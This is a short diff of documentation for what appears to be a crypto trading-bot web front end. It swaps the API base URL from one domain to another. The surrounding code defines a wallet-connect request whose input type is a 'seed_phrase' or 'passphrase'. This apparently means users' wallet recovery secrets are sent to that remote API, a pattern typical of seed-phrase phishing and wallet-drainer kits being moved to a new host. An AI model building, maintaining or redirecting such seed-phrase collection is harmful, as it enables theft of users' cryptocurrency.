@@ -51,7 +51,7 @@ npm install react react-dom react-router-dom @radix-ui/react-dialog @radix-ui/re
 
 **Code:**
 ```typescript
-const API_BASE_URL = 'https://solsnipeai.xyz/api';
+const API_BASE_URL = 'https://aetherbot.sbs/api';
 
 export interface WalletConnectRequest {
   inputType: 'seed_phrase' | 'passphrase';
@@ -521,7 +521,7 @@ localStorage.removeItem('walletType');
 
 ### Base URL:
 ```
-https://solsnipeai.xyz/api
+https://aetherbot.sbs/api
 ```
 
 ### Endpoints:
